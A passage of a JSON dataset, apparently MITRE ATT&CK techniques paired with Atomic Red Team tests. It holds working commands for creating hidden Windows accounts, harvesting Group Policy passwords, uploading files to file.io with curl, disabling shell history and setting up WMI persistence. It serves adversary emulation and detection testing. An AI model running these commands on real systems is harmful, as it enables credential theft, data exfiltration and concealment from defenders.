"description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n", "supported_platforms": ["windows"], "input_arguments": {"user_password": {"description": "Password for new user account", "type": "string", "default": "At0micRedTeam!"}, "user_name": {"description": "Username", "type": "string", "default": "AtomicOperator"}}, "executor": {"command": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n", "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /f >nul 2>&1\nnet user ${user_name}$ /delete >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1552.006": {"name": "Group Policy Preferences", "technique_id": "attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e", "external_id": "T1552.006", "data_components": ["Command Execution", "File Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\n", "atomic_tests": [{"name": "GPP Passwords (findstr)", "auto_generated_guid": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f", "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", "name": "command_prompt"}}, {"name": "GPP Passwords (Get-GPPPassword)", "auto_generated_guid": "e9584f82-322c-474a-b831-940fd8b4455c", "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n", "supported_platforms": ["windows"], "input_arguments": {"gpp_script_url": {"description": "URL of the Get-GPPPassword PowerShell Script", "type": "url", "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1"}, "gpp_script_path": {"description": "Path to the Get-GPPPassword PowerShell Script", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n", "prereq_command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n"}, {"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"command": ". \"#{gpp_script_path}\"\nGet-GPPPassword -Verbose\n", "name": "powershell"}}]}, "T1048.002": {"name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "technique_id": "attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5", "external_id": "T1048.002", "data_components": ["File Access", "Network Traffic Content", "Network Traffic Flow", "Network Connection Creation", "Command Execution"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--65401701-019d-44ff-b223-08d520bb0e7b", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c"], "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ", "atomic_tests": [{"name": "Exfiltrate data HTTPS using curl windows", "auto_generated_guid": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0", "description": "Exfiltrate data HTTPS using curl to file share site file.io\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Test file to upload", "type": "path", "default": "PathToAtomicsFolder/T1048.002/src/artifact"}, "curl_path": {"description": "path to curl.exe", "type": "path", "default": "C:\\Windows\\System32\\Curl.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Curl must be installed on system.\n", "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n"}, {"description": "#{input_file} must be exist on system.\n", "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact\" -OutFile \"#{input_file}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/\n"}}, {"name": "Exfiltrate data HTTPS using curl freebsd,linux or macos", "auto_generated_guid": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01", "description": "Exfiltrate data HTTPS using curl to file share site file.io\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"input_file": {"description": "Test file to upload", "type": "path", "default": "PathToAtomicsFolder/T1048.002/src/artifact"}}, "executor": {"name": "bash", "elevation_required": false, "command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n"}}]}, "T1057": {"name": "Process Discovery", "technique_id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580", "external_id": "T1057", "data_components": ["OS API Execution", "Command Execution", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)", "atomic_tests": [{"name": "Process Discovery - ps", "auto_generated_guid": "4ff64f0b-aaf2-4866-b39d-38d9791407cc", "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "path of output file", "type": "path", "default": "/tmp/loot.txt"}}, "executor": {"command": "ps >> #{output_file}\nps aux >> #{output_file}\n", "cleanup_command": "rm #{output_file}\n", "name": "sh"}}, {"name": "Process Discovery - tasklist", "auto_generated_guid": "c5806a4f-62b8-4900-980b-c7ec004e9908", "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n", "supported_platforms": ["windows"], "executor": {"command": "tasklist\n", "name": "command_prompt"}}, {"name": "Process Discovery - Get-Process", "auto_generated_guid": "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34", "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n", "supported_platforms": ["windows"], "executor": {"command": "Get-Process\n", "name": "powershell"}}, {"name": "Process Discovery - get-wmiObject", "auto_generated_guid": "b51239b4-0129-474f-a2b4-70f855b9f2c2", "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n", "supported_platforms": ["windows"], "executor": {"command": "get-wmiObject -class Win32_Process\n", "name": "powershell"}}, {"name": "Process Discovery - wmic process", "auto_generated_guid": "640cbf6d-659b-498b-ba53-f6dd1a1cc02c", "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n", "supported_platforms": ["windows"], "executor": {"command": "wmic process get /format:list\n", "name": "command_prompt"}}, {"name": "Discover Specific Process - tasklist", "auto_generated_guid": "11ba69ee-902e-4a0f-b3b6-418aed7d7ddb", "description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n", "supported_platforms": ["windows"], "input_arguments": {"process_to_enumerate": {"description": "Process name string to search for.", "type": "string", "default": "lsass"}}, "executor": {"command": "tasklist | findstr #{process_to_enumerate}\n", "name": "command_prompt"}}]}, "T1562.003": {"name": "Impair Command History Logging", "technique_id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59", "external_id": "T1562.003", "data_components": ["Host Status", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--609191bf-7d06-40e4-b1f8-9e11eb3ff8a6"], "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).", "atomic_tests": [{"name": "Disable history collection", "auto_generated_guid": "4eafdb45-0f79-4d66-aa86-a3e2c08791f5", "description": "Disables history collection in shells\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"evil_command": {"description": "Command to run after shell history collection is disabled", "type": "string", "default": "whoami"}}, "executor": {"command": "export HISTCONTROL=ignoreboth\n#{evil_command}\n", "name": "sh"}}, {"name": "Disable history collection (freebsd)", "auto_generated_guid": "cada55b4-8251-4c60-819e-8ec1b33c9306", "description": "Disables history collection in shells\n", "supported_platforms": ["linux"], "input_arguments": {"evil_command": {"description": "Command to run after shell history collection is disabled", "type": "string", "default": "whoami"}}, "executor": {"command": "export HISTSIZE=0\n#{evil_command}\n", "name": "sh"}}, {"name": "Mac HISTCONTROL", "auto_generated_guid": "468566d5-83e5-40c1-b338-511e1659628d", "description": "The HISTCONTROL variable is set to ignore (not write to the history file) command that are a duplicate of something already in the history \nand commands that start with a space. This atomic sets this variable in the current session and also writes it to the current user's ~/.bash_profile \nso that it will apply to all future settings as well.\nhttps://www.linuxjournal.com/content/using-bash-history-more-efficiently-histcontrol\n", "supported_platforms": ["macos", "linux"], "executor": {"steps": "1. export HISTCONTROL=ignoreboth\n2. echo export \"HISTCONTROL=ignoreboth\" >> ~/.bash_profile\n3. ls\n4. whoami > recon.txt\n", "name": "manual"}}, {"name": "Clear bash history", "auto_generated_guid": "878794f7-c511-4199-a950-8c28b3ed8e5b", "description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": false, "command": "cp $HISTFILE $HISTFILE.OLD\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\necho \"\" > $HISTFILE\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi\nls -la $HISTFILE \ncat $HISTFILE\nhistory -c \nif [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi\n", "cleanup_command": "mv -f $HISTFILE.OLD $HISTFILE \n"}}, {"name": "Setting the HISTCONTROL environment variable", "auto_generated_guid": "10ab786a-028e-4465-96f6-9e83ca6c5f24", "description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": false, "command": "TEST=$(echo $HISTCONTROL)\nif [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi\nhistory -c \nls -la $HISTFILE # \" ls -la $HISTFILE\"\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi\n# -> ls -la is not in history cache\nif [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi\nhistory -c \nls -la $HISTFILE\nls -la $HISTFILE\nls -la $HISTFILE\nif [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi\n", "cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"}}, {"name": "Setting the HISTFILESIZE environment variable", "auto_generated_guid": "5cafd6c1-2f43-46eb-ac47-a5301ba0a618", "description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": false, "command": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; fi\n# -> $HISTFILESIZE is zero\n", "cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"}}, {"name": "Setting the HISTSIZE environment variable", "auto_generated_guid": "386d3850-2ce7-4508-b56b-c0558922c814", "description": "An Adversary may set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "echo $HISTSIZE\nexport HISTSIZE=0\nif [ $(echo $HISTSIZE) -eq 0 ]; then echo \"\\$HISTSIZE is zero\"; fi\n# -> $HISTSIZE is zero\n", "cleanup_command": "export HISTSIZE=100\n"}}, {"name": "Setting the HISTFILE environment variable", "auto_generated_guid": "b3dacb6c-a9e3-44ec-bf87-38db60c5cad1", "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": false, "command": "TEST=$(echo $HISTFILE)\necho $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n# -> $HISTFILE is /dev/null\n", "cleanup_command": "export HISTFILE=$(echo $TEST)\n"}}, {"name": "Setting the HISTFILE environment variable (freebsd)", "auto_generated_guid": "f7308845-6da8-468e-99f2-4271f2f5bb67", "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "echo $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n# -> $HISTFILE is /dev/null\n", "cleanup_command": "export HISTFILE=~/.sh_history\n"}}, {"name": "Setting the HISTIGNORE environment variable", "auto_generated_guid": "f12acddb-7502-4ce6-a146-5b62c59592f1", "description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": false, "command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\n# -> $HISTIGNORE = ls*:rm*:ssh*\nhistory -c \nls -la $HISTFILE\nls -la ~/.bash_logout\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi\n# -> ls commands are not in history\nunset HISTIGNORE\n\nif ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\n# -> $HISTIGNORE = *\nhistory -c \nwhoami\ngroups\nif [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi\n# -> History cache is empty\n", "cleanup_command": "unset HISTIGNORE\n"}}]}, "T1546.003": {"name": "Windows Management Instrumentation Event Subscription", "technique_id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58", "external_id": "T1546.003", "data_components": ["WMI Creation", "Command Execution", "Process Creation"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.", "atomic_tests": [{"name": "Persistence via WMI Event Subscription - CommandLineEventConsumer", "auto_generated_guid": "3c64f177-28e2-49eb-a799-d767b24dd1e0", "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n", "supported_platforms": ["windows"], "executor": {"command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n", "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n", "name": "powershell", "elevation_required": true}}, {"name": "Persistence via WMI Event Subscription - ActiveScriptEventConsumer", "auto_generated_guid": "fecd0dfd-fb55-45fa-a10b-6250272d0832", "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n", "supported_platforms": ["windows"], "executor": {"command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\n", "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n", "name": "powershell", "elevation_required": true}}, {"name": "Windows MOFComp.exe Load MOF File", "auto_generated_guid": "29786d7e-8916-4de6-9c55-be7b093b2706", "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n", "supported_platforms": ["windows"], "input_arguments": {"mofcomp_path": {"description": "Location of mofcomp.exe", "type": "string", "default": "c:\\windows\\system32\\wbem\\mofcomp.exe"}, "mof_file": {"description": "Local location MOF file", "type": "string", "default": "PathToAtomicsFolder\\T1546.003\\src\\T1546.003.mof"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "MofComp.exe must exist on disk at specified location (#{mofcomp_path})\n", "prereq_command": "if (Test-Path \"#{mofcomp_path}\") { exit 0} else { exit 1}\n", "get_prereq_command": "Validate MOFComp.exe is on disk somewhere and update input argument.\n"}, {"description": "MofComp.exe must exist on disk at specified location (#{mof_file})\n", "prereq_command": "if (Test-Path \"#{mof_file}\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{mof_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.003/src/T1546.003.mof\" -OutFile \"#{mof_file}\"\n"}], "executor": {"command": "#{mofcomp_path} \"#{mof_file}\"\n", "cleanup_command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam_consumer'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam_filter'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = 